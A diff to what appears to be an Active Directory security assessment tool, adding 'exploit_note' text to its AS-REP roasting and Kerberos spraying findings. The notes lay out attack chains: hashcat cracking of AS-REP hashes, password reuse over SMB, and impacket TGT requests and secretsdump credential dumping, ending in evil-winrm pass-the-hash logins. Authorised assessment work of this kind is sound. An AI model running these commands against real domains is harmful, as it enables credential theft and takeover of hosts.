@@ -897,7 +897,13 @@ def findings(dc_ip: str, realm: str, results: list[dict],
             crack,
             "Require Kerberos pre-authentication on the account (clear DONT_REQ_PREAUTH) "
             "and enforce a long random password.",
-            ["CWE-262"], kind="asrep_roast"))
+            ["CWE-262"], kind="asrep_roast",
+            exploit_note=(
+                "Copy the $krb5asrep$ line from the finding into asrep.hash; "
+                "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt; on "
+                "crack, feed the password back via nxc smb <dc> -u <user> "
+                "-p '<pass>' --local-auth first, then domain auth."),
+            depth_tier="t2"))
     valid = [r for r in results if r["state"] in ("valid", "locked", "roastable")]
     if valid:
         names = ", ".join(r["user"] for r in valid[:15])
@@ -1033,7 +1039,13 @@ def spray_findings(dc_ip: str, realm: str, results: list[dict],
             "Enforce Kerberos FAST (PA-FX-FAST) armouring; monitor 4771 volume "
             "on the DC; count 4771 in the account lockout policy alongside "
             "4625; enforce unique long passwords.",
-            ["CWE-521", "CWE-307"], kind="kerberos_spray_success"))
+            ["CWE-521", "CWE-307"], kind="kerberos_spray_success",
+            exploit_note=(
+                "impacket-getTGT <realm>/<user>:'<pass>' -dc-ip <ip>; "
+                "export KRB5CCNAME=<user>.ccache; then impacket-secretsdump "
+                "-k -no-pass <target>; then evil-winrm -i <target> -u <user> "
+                "-H <nt>."),
+            depth_tier="t3"))
     return out
 
 
